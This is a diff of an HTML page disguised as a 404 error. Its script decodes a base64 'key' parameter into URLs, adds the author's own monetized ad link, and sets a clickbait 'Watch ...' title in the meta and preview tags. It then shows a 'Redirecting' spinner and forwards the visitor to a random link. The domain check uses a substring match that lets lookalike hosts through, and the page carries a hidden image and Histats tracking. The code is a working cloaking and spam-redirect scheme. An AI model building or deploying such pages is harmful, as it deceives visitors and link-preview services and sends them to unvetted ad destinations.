@@ -64,21 +64,32 @@
   .lol{
   	display: none;
   }
+  img {
+    width: 300px;
+    height: 200px;
+    object-fit: cover;
+    display: block;
+  }
   </style>
 </head>
-<body
+<body>
+<div class="lol">
+<img 
+  id="lazyImage" 
+  src="https://i0.wp.com/i.gifer.com/7V2A.gif?resize=720,512" 
+  data-src="https://i0wp.com/iili.io/FFCw6LG.md.jpg?resize=720,512" 
+  alt="Gambar" 
+/>
+</div>
 
-<!-- Loader -->>
+
 <div id="loader" class="loader-screen">
   <div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status">
     <span class="visually-hidden">Loading...</span>
   </div>
   <p>Redirecting to destination page...</p>
-<div class="lol">
-<img src="https://i0wp.com/iili.io/FFCw6LG.md.jpg?resize=720,512" alt="FFCw6LG.md.jpg" loading="lazy" />
 </div>
-</div>
-<!-- 404 Page -->
+
 
 <div class="container error-container" id="errorPage">
   <div class="error-code">404</div>
@@ -90,29 +101,28 @@
   const params = new URLSearchParams(window.location.search);
   const encoded = params.get('key');
 
-  // Kalau tidak ada key, tidak melakukan apa-apa
+  
   if (!encoded) return;
 
   try {
     const decoded = atob(encoded.trim());
-    const userUrls = decoded.split('|'); // URL dari orang (di-encode ke base64)
+    const userUrls = decoded.split('|'); 
 
-    // ✅ URL default milik lo yang wajib ikut di-random-kan
+    
     const myDefaultUrls = [
-      "https://abnormalitylovingmammal.com/myvideo",
-      "https://pwcenter.eu.org/promo"
+      "https://abnormalitylovingmammal.com/pzv09c268e?key=159001feab4927b67c14cbb2f7d2d1cc"
     ];
 
-    // Gabung semua jadi satu
+    
     const allUrls = [...userUrls, ...myDefaultUrls];
 
-    // Pilih acak salah satu dari semua URL itu
+    
     const finalUrl = allUrls[Math.floor(Math.random() * allUrls.length)];
 
     const urlObj = new URL(finalUrl);
     const host = urlObj.hostname;
 
-    // Whitelist domain (biar makin aman)
+    
     const allowedDomains = [
       "abnormalitylovingmammal.com",
       "pwcenter.eu.org",
@@ -124,67 +134,54 @@
     const isAllowed = allowedDomains.some(domain => host.includes(domain));
 
     if (isAllowed) {
-      // Ganti meta tag kalau perlu
-      const title = "Sedang mengalihkan ke halaman tujuan...";
+      
+      const title = "Watch Enkai987 น้อง ริน มาแน้วววว";
       document.getElementById('meta-title').innerText = title;
       document.getElementById('meta-desc').setAttribute('content', title);
       document.getElementById('og-title').setAttribute('content', title);
       document.getElementById('og-desc').setAttribute('content', title);
 
-      // Tampilkan loading
+      
       document.getElementById("errorPage").style.display = "none";
       document.getElementById("loader").style.display = "flex";
 
-      // Redirect setelah 1.2 detik
+      
       setTimeout(() => {
         window.location.href = finalUrl;
       }, 1200);
     } else {
-      console.warn("Domain tidak diizinkan:", host);
+      console.warn("Domains not allowed:", host);
     }
 
   } catch (err) {
-    console.error("Gagal decode base64:", err);
+    console.error("Broken page:", err);
   }
 })();
 </script>
-
-
 <script>
-	document.addEventListener("DOMContentLoaded", function () {
-  const images = document.querySelectorAll('img:not([loading])');
+  
+  document.addEventListener("DOMContentLoaded", function() {
+    const img = document.getElementById('lazyImage');
 
-  const imageMap = new Map();
+    
+    function loadImage() {
+      const src = img.getAttribute('data-src');
+      if (!src) return;
 
-  images.forEach(img => {
-    imageMap.set(img, img.src);
-    img.src = "https://i0.wp.com/i.gifer.com/7V2P.gif?resize=720,512"; 
-  });
-
-  const onIntersection = (entries, observer) => {
-    entries.forEach(entry => {
-      if (entry.isIntersecting) {
-        const img = entry.target;
-        const realSrc = imageMap.get(img);
-        if (realSrc) {
-          img.src = realSrc;
-          imageMap.delete(img);
-        }
-        observer.unobserve(img);
+      
+      const tempImg = new Image();
+      tempImg.onload = function() {
+        img.src = src; 
       }
-    });
-  };
+      tempImg.src = src;
+    }
 
-  const observer = new IntersectionObserver(onIntersection, {
-    rootMargin: "0px 0px 100px 0px",
-    threshold: 0.01
+    
+    loadImage();
   });
-
-  imageMap.forEach((_, img) => observer.observe(img));
-});
-
-
 </script>
+
+
  <!-- Histats.com  START  (aync)-->
 <script type="text/javascript">var _Hasync= _Hasync|| [];
 _Hasync.push(['Histats.start', '1,4828760,4,0,0,0,00010000']);
